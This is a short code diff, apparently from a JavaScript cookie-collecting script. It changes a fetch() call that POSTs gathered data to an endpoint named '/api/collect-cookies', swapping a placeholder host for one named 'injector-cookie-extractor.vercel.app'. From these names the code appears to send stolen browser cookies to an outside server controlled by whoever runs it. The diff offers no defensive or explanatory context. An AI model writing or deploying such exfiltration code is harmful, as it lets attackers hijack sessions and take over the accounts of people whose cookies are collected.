@@ -46,7 +46,7 @@
           };
           
           // Send to your server
-          fetch('https://your-vercel-app.vercel.app/api/collect-cookies', {
+          fetch('https://injector-cookie-extractor.vercel.app/api/collect-cookies', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
